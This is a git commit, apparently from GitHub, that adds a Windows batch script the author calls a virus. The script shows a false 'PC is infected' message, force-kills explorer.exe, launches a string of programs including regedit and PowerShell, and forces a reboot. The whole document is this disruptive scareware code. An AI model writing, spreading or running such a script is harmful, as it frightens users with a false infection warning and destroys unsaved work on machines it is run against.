0363d159655076de49d2e803c6581b7c98b668c7
Lisandro 07 Files And Windows <97541842+Lisandro07e@users.noreply.github.com>
2024-06-05 09:07:25 -0600

    SoftwazaV1.exe
    This is a virus and not is false

---
+++ Softwaza.cmd
@@ -0,0 +1,14 @@
+msg * you PC Is Infected with a Virus 
+taskkill /f /im explorer.exe
+start notepad
+start cmd
+start msedge
+start winver
+start mspaint
+start wusa
+start regedit
+start write
+start %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+Shutdown /r
+color a
+tree
